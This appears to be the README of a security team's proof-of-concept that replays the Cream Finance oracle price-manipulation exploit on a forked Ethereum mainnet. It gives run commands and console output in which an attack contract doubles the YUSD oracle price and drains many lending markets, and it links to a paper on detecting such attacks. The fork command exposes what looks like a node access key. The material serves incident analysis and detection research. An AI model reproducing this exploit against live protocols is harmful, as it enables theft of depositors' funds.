# CREAM_ORACLE PoC

> Block: #13499798

## How to run

Install brownie first

Set up the environment variable for $ARCHIVENODE_TOKEN


```
export $ARCHIVENODE_TOKEN = xxxxx
sh start_archive.sh

then 

sh run.sh
```

- Result:

```bash
Brownie v1.16.2 - Python development framework for Ethereum

CreamProject is the active project.

Launching 'ganache-cli --port 8849 --gasLimit 880000000000 --accounts 10 --hardfork istanbul --mnemonic brownie --fork https://speedy-nodes-nyc.moralis.io/20189123bd8fd22f2ac08e16/eth/mainnet/archive/@13499797 --defaultBalanceEther 10000000000000 --chainId 1'...

Running 'scripts/gbu.py::main'...

Deploying attack contract...
Transaction sent: 0x9af371e792238e1c68882b9057296d5a3c28e48a1df8163f05b1f878072d3ce0
  Gas price: 0.0 gwei   Gas limit: 880000000000   Nonce: 2
  Luck.constructor confirmed   Block: 13499799   Gas used: 3180843 (0.00%)
  Luck deployed at: 0xE7eD6747FaC5360f88a2EFC03E00d25789F69291

> Before The YUSD's price in cream.finance oracle: 279300989383783

Launch attack...
Transaction sent: 0x3a1265b942688707f81cbd3adf420db3b81ae8fff0768696c9f84bcc4f367b45
  Gas price: 0.0 gwei   Gas limit: 880000000000   Nonce: 3
  Luck.luck confirmed   Block: 13499800   Gas used: 28578950 (0.00%)

> After The YUSD's price in cream.finance oracle: 558660521726027


🧛 The profit list:
ETH profits:  1966.078292523257
Ypool_LP profits:  166385.4648287775
attack contract1 Luck's liquidity in cream.finance: liquidity = 25266095875700508730941, shortfall = 0
attack contract2 LuckPartner's liquidity in cream.finance: liquidity = 0, shortfall = 368876768432684334164260
CrETH cash: 0, CrETH profits: 0
The cash of crCRETH2 in cream.finance is 0.
crCRETH2 balance: 0, CRETH2 balance: 12266463816009145730493
The cash of crXSUSHI in cream.finance is 0.
crXSUSHI balance: 0, xSUSHI balance: 623760529988486822779519
The cash of crWNXM in cream.finance is 0.
crWNXM balance: 0, wNXM balance: 135402944541301517084130
The cash of crPERP in cream.finance is 0.
crPERP balance: 0, PERP balance: 447222593590652214743874
The cash of crRUNE in cream.finance is 0.
crRUNE balance: 0, RUNE balance: 418917294792442850457949
The cash of crDPI in cream.finance is 0.
crDPI balance: 0, DPI balance: 15567575750097560251951
The cash of crUNI in cream.finance is 0.
crUNI balance: 0, UNI balance: 156629158238930877722356
The cash of crUSDC in cream.finance is 0.
crUSDC balance: 0, USDC balance: 4324457152800
The cash of crFEI in cream.finance is 0.
crFEI balance: 0, FEI balance: 3817374503105485458327683
The cash of crUSDT in cream.finance is 0.
crUSDT balance: 0, USDT balance: 3780808755759
The cash of crYVCurve-stETH in cream.finance is 0.
crYVCurve-stETH balance: 0, yvCurve-stETH balance: 747480864886637652351
The cash of crGNO in cream.finance is 0.
crGNO balance: 0, GNO balance: 6937023757101307138911
The cash of crFTT in cream.finance is 0.
crFTT balance: 0, FTX Token balance: 38922154159018669294167
The cash of crYGG in cream.finance is 0.
crYGG balance: 0, YGG balance: 341681583099484551498506
The cash of crYUSD in cream.finance is 0.
crYUSD balance: 6701346099885525301, yUSD balance: 0
```

> NOTE: We can see the price of yusd in cream.finance is doubled after this expolit. 
> 
> It likes some kind of price manipulation (direct one) that was described in our paper: DeFiRanger: Detecting Price Manipulation Attacks on DeFi Applications https://arxiv.org/abs/2104.15068).

## link 

- https://twitter.com/BlockSecTeam/status/1453393444047441923

## More About:
- https://blocksecteam.com
